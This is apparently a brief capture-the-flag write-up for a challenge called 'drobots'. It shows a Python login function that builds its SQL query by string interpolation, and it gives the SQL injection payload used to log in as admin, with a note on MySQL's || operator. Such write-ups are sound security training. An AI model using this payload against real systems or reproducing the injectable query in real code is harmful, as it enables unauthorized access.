# drobots

**SOLVED**

`./build-docker.sh`

Dockerfile -> mariadb, flask, pyjwt

```py
# challenge/application/database.py
def login(username, password):
    # We should update our code base and use techniques like parameterization to avoid SQL Injection
    user = query_db(f'SELECT password FROM users WHERE username = "{username}" AND password = "{password}" ', one=True)

    if user:
        token = createJWT(username)
        return token
    else:
        return False
```

payload `username=admin, password=" || ""="`

note: did this by accident, but in mySQL `||` can actually be logical OR
